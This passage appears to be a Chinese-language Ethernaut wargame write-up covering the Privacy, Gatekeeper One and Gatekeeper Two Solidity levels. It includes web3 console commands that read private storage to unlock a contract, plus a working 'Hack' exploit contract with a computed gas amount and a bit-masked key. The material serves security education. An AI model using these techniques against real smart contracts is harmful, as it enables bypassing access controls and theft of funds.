<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="w"> </span><span class="nx">building</span><span class="p">.</span><span class="nx">isLastFloor</span><span class="p">(</span><span class="nx">_floor</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nx">floor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_floor</span><span class="p">;</span>
<span class="w">      </span><span class="nx">top</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">building</span><span class="p">.</span><span class="nx">isLastFloor</span><span class="p">(</span><span class="nx">floor</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<ul>
<li>Êé•Âè£ÂáΩÊï∞ÂèØ‰ª•ÈÄöËøáÂ£∞Êòé <code>view</code> Êù•Èò≤Ê≠¢Áä∂ÊÄÅË¢´ÁØ°ÊîπÔºå<code>pure</code> ÂêåÁêÜ</li>
<li>Âú®‰∏çÊîπÂèòÁä∂ÊÄÅÁöÑÊÉÖÂÜµ‰∏ãÔºåÂèØ‰ª•Ê†πÊçÆ‰∏çÂêåÁöÑËæìÂÖ•Êï∞ÊçÆÊù•ËøîÂõû‰∏çÂêåÁöÑÁªìÊûúÔºåÂ¶Ç <code>gasleft()</code></li>
</ul>
<h3 id="_7">ÂèÇËÄÉËµÑÊñô<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h3>
<ul>
<li><a href="https://solidity-by-example.org/interface/">Interface | Solidity by Example</a></li>
<li><a href="https://docs.soliditylang.org/en/develop/contracts.html#view-functions">View Functions</a></li>
</ul>
<h2 id="12-privacy">12. Privacy<a class="headerlink" href="#12-privacy" title="Permanent link">&para;</a></h2>
<p>Ëß£ÈîÅÔºÅ(<a href="#8-vault">Vault</a> ÂçáÁ∫ßÁâà)</p>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">Privacy</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="c1">// slot 0</span>
<span class="w">  </span><span class="nx">bool</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">locked</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>

<span class="w">  </span><span class="c1">// slot 1</span>
<span class="w">  </span><span class="nx">uint256</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">ID</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">block</span><span class="p">.</span><span class="nx">timestamp</span><span class="p">;</span><span class="w">  </span><span class="c1">// uint256 is 32 bytes long</span>

<span class="w">  </span><span class="c1">// slot 2</span>
<span class="w">  </span><span class="nx">uint8</span><span class="w"> </span><span class="kr">private</span><span class="w"> </span><span class="nx">flattening</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">10</span><span class="p">;</span>
<span class="w">  </span><span class="nx">uint8</span><span class="w"> </span><span class="kr">private</span><span class="w"> </span><span class="nx">denomination</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">255</span><span class="p">;</span>
<span class="w">  </span><span class="nx">uint16</span><span class="w"> </span><span class="kr">private</span><span class="w"> </span><span class="nx">awkwardness</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">uint16</span><span class="p">(</span><span class="nx">now</span><span class="p">);</span>

<span class="w">  </span><span class="c1">// slot 3, 4, 5</span>
<span class="w">  </span><span class="nx">bytes32</span><span class="p">[</span><span class="mf">3</span><span class="p">]</span><span class="w"> </span><span class="kr">private</span><span class="w"> </span><span class="nx">data</span><span class="p">;</span>

<span class="w">  </span><span class="kr">constructor</span><span class="p">(</span><span class="nx">bytes32</span><span class="p">[</span><span class="mf">3</span><span class="p">]</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">_data</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_data</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">unlock</span><span class="p">(</span><span class="nx">bytes16</span><span class="w"> </span><span class="nx">_key</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">_key</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">bytes16</span><span class="p">(</span><span class="nx">data</span><span class="p">[</span><span class="mf">2</span><span class="p">]));</span>
<span class="w">    </span><span class="nx">locked</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="cm">/*</span>
<span class="cm">    A bunch of super advanced solidity algorithms...</span>

<span class="cm">      ,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`</span>
<span class="cm">      .,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,</span>
<span class="cm">      *.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^         ,---/V\</span>
<span class="cm">      `*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.    ~|__(o.o)</span>
<span class="cm">      ^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;  UU  UU</span>
<span class="cm">  */</span>
<span class="p">}</span>
</code></pre></div>
<ul>
<li>ÊØè‰∏™ slot Â§ßÂ∞è‰∏∫ 32 Â≠óËäÇÔºåÂΩìÈÇªËøëÂèòÈáè‰πüËÉΩÂ§üÊîæËøõÂçï‰∏™ slot Êó∂ÔºåÂ∞ÜÊåâ‰ªéÂè≥Âà∞Â∑¶ÁöÑÈ°∫Â∫è‰æùÊ¨°ÊîæÂÖ•</li>
<li>Â∏∏Èáè‰∏çÂ≠òÂÇ®</li>
</ul>
<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">getStorageAt</span><span class="p">(</span><span class="nx">instance</span><span class="p">,</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span>
<span class="s2">&quot;0x0000000000000000000000000000000000000000000000000000000000000001&quot;</span>
<span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">getStorageAt</span><span class="p">(</span><span class="nx">instance</span><span class="p">,</span><span class="w"> </span><span class="mf">1</span><span class="p">)</span>
<span class="s2">&quot;0x000000000000000000000000000000000000000000000000000000006210d5b1&quot;</span>
<span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">getStorageAt</span><span class="p">(</span><span class="nx">instance</span><span class="p">,</span><span class="w"> </span><span class="mf">2</span><span class="p">)</span>
<span class="s2">&quot;0x00000000000000000000000000000000000000000000000000000000d5b1ff0a&quot;</span><span class="w"> </span><span class="c1">// 0a for flattening, ff for denomination</span>
<span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">getStorageAt</span><span class="p">(</span><span class="nx">instance</span><span class="p">,</span><span class="w"> </span><span class="mf">3</span><span class="p">)</span>
<span class="s2">&quot;0xc3003c2bcb65196b8352fb925d945f9229929bcc727f70ea451255859a6a4f56&quot;</span>
<span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">getStorageAt</span><span class="p">(</span><span class="nx">instance</span><span class="p">,</span><span class="w"> </span><span class="mf">4</span><span class="p">)</span>
<span class="s2">&quot;0x6d6f76ea288ee9c55ab1ad76264518237a23af3495ee5702f57a164f8aeb99b0&quot;</span>
<span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">getStorageAt</span><span class="p">(</span><span class="nx">instance</span><span class="p">,</span><span class="w"> </span><span class="mf">5</span><span class="p">)</span>
<span class="s2">&quot;0x06e3eb3b9e34467cbf1a226fc2bd13e5948a7a15ef2205caf186fa3df3076f53&quot;</span><span class="w">  </span><span class="c1">// data[2]</span>
</code></pre></div>
<ul>
<li>
<p>Áî±‰∫é <code>_key</code> ‰∏∫ <code>bytes16</code> Á±ªÂûãÔºåÈúÄË¶ÅÂØπ <code>data[2]</code> ËøõË°åÁ±ªÂûãËΩ¨Êç¢</p>
<div class="highlight"><pre><span></span><code><span class="c1">// ‰ªé bytes32 Âà∞ bytes16ÔºåÂè™ÈúÄË¶ÅÁßªËµ∞Âè≥‰æßÁöÑ 16 Â≠óËäÇÔºåÂç≥ 32 ‰ΩçÂçÅÂÖ≠ËøõÂà∂Êï∞</span>
<span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">unlock</span><span class="p">(</span><span class="s2">&quot;0x06e3eb3b9e34467cbf1a226fc2bd13e5&quot;</span><span class="p">)</span>
</code></pre></div>
</li>
</ul>
<h3 id="_8">ÂèÇËÄÉËµÑÊñô<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h3>
<p><a href="https://solidity-by-example.org/hacks/accessing-private-data/">Accessing Private Data | Solidity by Example</a></p>
<h2 id="13-gatekeeper-one">13. Gatekeeper One<a class="headerlink" href="#13-gatekeeper-one" title="Permanent link">&para;</a></h2>
<p>Ë∂äËøáÂÆàÈó®‰∫∫Âπ∂Ê≥®ÂÜå‰∏∫ÂèÇËµõËÄÖ</p>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">GatekeeperOne</span><span class="w"> </span><span class="p">{</span>

<span class="w">  </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">entrant</span><span class="p">;</span>

<span class="w">  </span><span class="nx">modifier</span><span class="w"> </span><span class="nx">gateOne</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nx">tx</span><span class="p">.</span><span class="nx">origin</span><span class="p">);</span>
<span class="w">    </span><span class="nx">_</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="nx">modifier</span><span class="w"> </span><span class="nx">gateTwo</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">gasleft</span><span class="p">()</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="mf">8191</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">0</span><span class="p">);</span>
<span class="w">    </span><span class="nx">_</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="nx">modifier</span><span class="w"> </span><span class="nx">gateThree</span><span class="p">(</span><span class="nx">bytes8</span><span class="w"> </span><span class="nx">_gateKey</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="c1">// uint64 is 8 bytes long</span>
<span class="w">      </span><span class="c1">// _gateKey % 2^32 == _gateKey % 2^16</span>
<span class="w">      </span><span class="nx">require</span><span class="p">(</span><span class="nx">uint32</span><span class="p">(</span><span class="nx">uint64</span><span class="p">(</span><span class="nx">_gateKey</span><span class="p">))</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">uint16</span><span class="p">(</span><span class="nx">uint64</span><span class="p">(</span><span class="nx">_gateKey</span><span class="p">)),</span><span class="w"> </span><span class="s2">&quot;GatekeeperOne: invalid gateThree part one&quot;</span><span class="p">);</span>
<span class="w">      </span><span class="c1">// _gateKey % 2^32 != _gateKey</span>
<span class="w">      </span><span class="nx">require</span><span class="p">(</span><span class="nx">uint32</span><span class="p">(</span><span class="nx">uint64</span><span class="p">(</span><span class="nx">_gateKey</span><span class="p">))</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nx">uint64</span><span class="p">(</span><span class="nx">_gateKey</span><span class="p">),</span><span class="w"> </span><span class="s2">&quot;GatekeeperOne: invalid gateThree part two&quot;</span><span class="p">);</span>
<span class="w">      </span><span class="c1">// _gateKey % 2^32 == tx.origin % 2^16</span>
<span class="w">      </span><span class="nx">require</span><span class="p">(</span><span class="nx">uint32</span><span class="p">(</span><span class="nx">uint64</span><span class="p">(</span><span class="nx">_gateKey</span><span class="p">))</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">uint16</span><span class="p">(</span><span class="nx">uint160</span><span class="p">(</span><span class="nx">tx</span><span class="p">.</span><span class="nx">origin</span><span class="p">)),</span><span class="w"> </span><span class="s2">&quot;GatekeeperOne: invalid gateThree part three&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="nx">_</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">enter</span><span class="p">(</span><span class="nx">bytes8</span><span class="w"> </span><span class="nx">_gateKey</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">gateOne</span><span class="w"> </span><span class="nx">gateTwo</span><span class="w"> </span><span class="nx">gateThree</span><span class="p">(</span><span class="nx">_gateKey</span><span class="p">)</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">entrant</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">tx</span><span class="p">.</span><span class="nx">origin</span><span class="p">;</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<ul>
<li>‰ΩøÁî®‰∏é <a href="#4-telephone">Telephone</a> Áõ∏ÂêåÁöÑÊñπÂºèÈÄöËøá <code>gateOne</code></li>
<li>
<p>Ëá≥‰∫é <code>gateTwo</code>ÔºåÂú® Remix ÁöÑ JavaScript VM ÁéØÂ¢É‰∏ãÈÄöËøá Debug Êù•Ëé∑ÂèñÂÖ∑‰ΩìÊâÄÈúÄÊ±ΩÊ≤πÈáè</p>
<ul>
<li><strong>Ê≥®ÊÑè</strong>Ôºö‰∏çÂêåÁâàÊú¨ÁöÑ EVM ÊàñÁºñËØëÂô®ÈÉΩ‰ºöÂØºËá¥‰∏çÂêåÁöÑÊ±ΩÊ≤πÊ∂àËÄóÈáè</li>
<li>È¶ñÂÖàÈÄâÊã©‰∏Ä‰∏™ËæÉÂ§ßÁöÑÊ±ΩÊ≤πÈáèÔºåÂ¶Ç <code>90000</code></li>
<li>
<p>ÊâßË°åÂÆåÊàêÂêéÔºåËøõÂÖ• <code>DEBUGGER</code>ÔºåÊâßË°åÂÆåÊìç‰ΩúÁ†Å <code>GAS</code>ÔºåÊ≠§Êó∂Ââ©‰ΩôÁöÑÊ±ΩÊ≤πÈáè‰∏∫ <code>89577</code><br>
<img alt="89577" src="../img/ethernaut04.jpg" /></p>
</li>
<li>
<p>Áî±Ê≠§ÂèØËÆ°ÁÆóÂá∫ÈÄöËøá <code>gateTwo</code> ÂÆûÈôÖÈúÄË¶ÅÁöÑÊúÄÂ∞ëÊ±ΩÊ≤πÈáèÔºö<span class="arithmatex">\(90000-89577+8191\times 3=24996\)</span></p>
<ul>
<li><code>entrant = tx.origin</code> ÂåÖÂê´ <code>SSTORE</code> Êìç‰ΩúÁ†ÅÔºåÂõ†‰∏∫ <code>entrant</code> Êú™Ë¢´ÂÜôÂÖ•ËøáÔºåËá≥Â∞ëÈúÄË¶ÅÊ∂àËÄó 20000 Ê±ΩÊ≤π</li>
</ul>
</li>
<li>Âú® Goerli ÊµãËØïÁΩëÁªú‰∏≠ËøêË°åÊó∂‰ºöÊäõÂá∫ÂºÇÂ∏∏ÔºåÂÜçÊ¨°Ë∞ÉËØïÔºåËßÇÂØüÊ†à‰∏≠Âá∫Áé∞ <code>0x1fff(8191)</code> ÁöÑ‰∏ã‰∏Ä‰∏™Êï∞Â≠óÔºå‰∏∫ <code>0x60a4(24740)</code>ÔºåÂæóÂá∫ÊúÄÁªàÈúÄË¶ÅÁöÑÊ±ΩÊ≤πÈáè‰∏∫Ôºö<span class="arithmatex">\(24996-24740+8191\times 3=24829\)</span><br>
<img alt="0x60a4" src="../img/ethernaut05.jpg" /></li>
</ul>
</li>
<li>
<p>ÂØπ‰∫é <code>gateThree</code>ÔºåÁî® <span class="arithmatex">\(A_0A_1...A_7\)</span> Êù•Ë°®Á§∫ <code>_gateKey</code> ÁöÑÂêÑ‰∏™Â≠óËäÇ</p>
<ul>
<li><code>part one</code> ÈúÄÊª°Ë∂≥ <span class="arithmatex">\(A_4A_5A_6A_7 = A_6A_7\)</span></li>
<li><code>part two</code> ÈúÄÊª°Ë∂≥ <span class="arithmatex">\(A_4A_5A_6A_7 \neq A_0A_1...A_7\)</span></li>
<li><code>part three</code> ÈúÄÊª°Ë∂≥ <span class="arithmatex">\(A_4A_5A_6A_7 = B_6B_7\)</span> ÔºàËßÜ‰Ωú <code>tx.origin</code> Âêé‰∏§‰∏™Â≠óËäÇÔºâ</li>
<li>‰πüÂ∞±ÊòØËØ¥Ôºå<code>_gateKey</code> Âè™ÈúÄË¶ÅÂêé‰∏§‰∏™Â≠óËäÇ‰∏é <code>tx.origin</code> ‰∏ÄËá¥ÔºåÂÄíÊï∞‰∏âÂõõÂ≠óËäÇ‰∏∫ <span class="arithmatex">\(0\)</span>ÔºåÂâ©‰∏ãÂõõ‰∏™Â≠óËäÇ‰∏ç‰∏∫ <span class="arithmatex">\(0\)</span> Â∞±ÂèØ‰ª•‰∫Ü &gt;v&lt;</li>
</ul>
</li>
</ul>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">GatekeeperOne</span><span class="w"> </span><span class="p">{</span>

<span class="w">  </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">entrant</span><span class="p">;</span>

<span class="w">  </span><span class="nx">modifier</span><span class="w"> </span><span class="nx">gateOne</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nx">tx</span><span class="p">.</span><span class="nx">origin</span><span class="p">);</span>
<span class="w">    </span><span class="nx">_</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="nx">modifier</span><span class="w"> </span><span class="nx">gateTwo</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">gasleft</span><span class="p">()</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="mf">8191</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">0</span><span class="p">);</span>
<span class="w">    </span><span class="nx">_</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="nx">modifier</span><span class="w"> </span><span class="nx">gateThree</span><span class="p">(</span><span class="nx">bytes8</span><span class="w"> </span><span class="nx">_gateKey</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nx">require</span><span class="p">(</span><span class="nx">uint32</span><span class="p">(</span><span class="nx">uint64</span><span class="p">(</span><span class="nx">_gateKey</span><span class="p">))</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">uint16</span><span class="p">(</span><span class="nx">uint64</span><span class="p">(</span><span class="nx">_gateKey</span><span class="p">)),</span><span class="w"> </span><span class="s2">&quot;GatekeeperOne: invalid gateThree part one&quot;</span><span class="p">);</span>
<span class="w">      </span><span class="nx">require</span><span class="p">(</span><span class="nx">uint32</span><span class="p">(</span><span class="nx">uint64</span><span class="p">(</span><span class="nx">_gateKey</span><span class="p">))</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nx">uint64</span><span class="p">(</span><span class="nx">_gateKey</span><span class="p">),</span><span class="w"> </span><span class="s2">&quot;GatekeeperOne: invalid gateThree part two&quot;</span><span class="p">);</span>
<span class="w">      </span><span class="nx">require</span><span class="p">(</span><span class="nx">uint32</span><span class="p">(</span><span class="nx">uint64</span><span class="p">(</span><span class="nx">_gateKey</span><span class="p">))</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">uint16</span><span class="p">(</span><span class="nx">uint160</span><span class="p">(</span><span class="nx">tx</span><span class="p">.</span><span class="nx">origin</span><span class="p">)),</span><span class="w"> </span><span class="s2">&quot;GatekeeperOne: invalid gateThree part three&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="nx">_</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">enter</span><span class="p">(</span><span class="nx">bytes8</span><span class="w"> </span><span class="nx">_gateKey</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">gateOne</span><span class="w"> </span><span class="nx">gateTwo</span><span class="w"> </span><span class="nx">gateThree</span><span class="p">(</span><span class="nx">_gateKey</span><span class="p">)</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">entrant</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">tx</span><span class="p">.</span><span class="nx">origin</span><span class="p">;</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">Hack</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">exploit</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">instance</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">GatekeeperOne</span><span class="w"> </span><span class="nx">gk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">GatekeeperOne</span><span class="p">(</span><span class="nx">instance</span><span class="p">);</span>
<span class="w">    </span><span class="nx">bytes8</span><span class="w"> </span><span class="nx">_gateKey</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">bytes8</span><span class="p">(</span><span class="nx">uint64</span><span class="p">(</span><span class="nx">uint160</span><span class="p">(</span><span class="nx">tx</span><span class="p">.</span><span class="nx">origin</span><span class="p">))</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mh">0xff0000ffff</span><span class="p">);</span>
<span class="w">    </span><span class="nx">gk</span><span class="p">.</span><span class="nx">enter</span><span class="p">{</span><span class="nx">gas</span><span class="o">:</span><span class="w"> </span><span class="mf">24829</span><span class="p">}(</span><span class="nx">_gateKey</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<h3 id="_9">ÂèÇËÄÉËµÑÊñô<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h3>
<ul>
<li><a href="https://medium.com/coinmonks/solidity-variables-storage-type-conversions-and-accessing-private-variables-c59b4484c183">Solidity variables ‚Äî storage, type conversions and accessing private variables</a></li>
<li><a href="https://ethereum.stackexchange.com/questions/84670/why-does-remixs-jsvm-show-incorrect-gas">solidity - Why does Remix's jsVM show incorrect gas? - Ethereum Stack Exchange</a></li>
<li><a href="https://ethereum.org/en/developers/docs/evm/opcodes/">Opcodes for the EVM | ethereum.org</a></li>
</ul>
<h2 id="14-gatekeeper-two">14. Gatekeeper Two<a class="headerlink" href="#14-gatekeeper-two" title="Permanent link">&para;</a></h2>
<p>ÈÄöËøáÊñ∞ÁöÑÊåëÊàòÔºÅ</p>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">GatekeeperTwo</span><span class="w"> </span><span class="p">{</span>

<span class="w">  </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">entrant</span><span class="p">;</span>

<span class="w">  </span><span class="nx">modifier</span><span class="w"> </span><span class="nx">gateOne</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nx">tx</span><span class="p">.</span><span class="nx">origin</span><span class="p">);</span>
<span class="w">    </span><span class="nx">_</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="nx">modifier</span><span class="w"> </span><span class="nx">gateTwo</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">uint</span><span class="w"> </span><span class="nx">x</span><span class="p">;</span>
<span class="w">    </span><span class="nx">assembly</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">x</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">extcodesize</span><span class="p">(</span><span class="nx">caller</span><span class="p">())</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="c1">// ÂÜÖËÅîÊ±áÁºñ</span>
<span class="w">    </span><span class="c1">// caller() - call sender (excluding delegatecall)</span>
<span class="w">    </span><span class="c1">// extcodesize(a) - size of the code at address a</span>
<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">x</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">0</span><span class="p">);</span>
<span class="w">    </span><span class="nx">_</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="nx">modifier</span><span class="w"> </span><span class="nx">gateThree</span><span class="p">(</span><span class="nx">bytes8</span><span class="w"> </span><span class="nx">_gateKey</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">uint64</span><span class="p">(</span><span class="nx">bytes8</span><span class="p">(</span><span class="nx">keccak256</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodePacked</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">))))</span><span class="w"> </span><span class="o">^</span><span class="w"> </span><span class="nx">uint64</span><span class="p">(</span><span class="nx">_gateKey</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">type</span><span class="p">(</span><span class="nx">uint64</span><span class="p">).</span><span class="nx">max</span><span class="p">);</span>
<span class="w">    </span><span class="nx">_</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">enter</span><span class="p">(</span><span class="nx">bytes8</span><span class="w"> </span><span class="nx">_gateKey</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">gateOne</span><span class="w"> </span><span class="nx">gateTwo</span><span class="w"> </span><span class="nx">gateThree</span><span class="p">(</span><span class="nx">_gateKey</span><span class="p">)</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">entrant</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">tx</span><span class="p">.</span><span class="nx">origin</span><span class="p">;</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<ul>
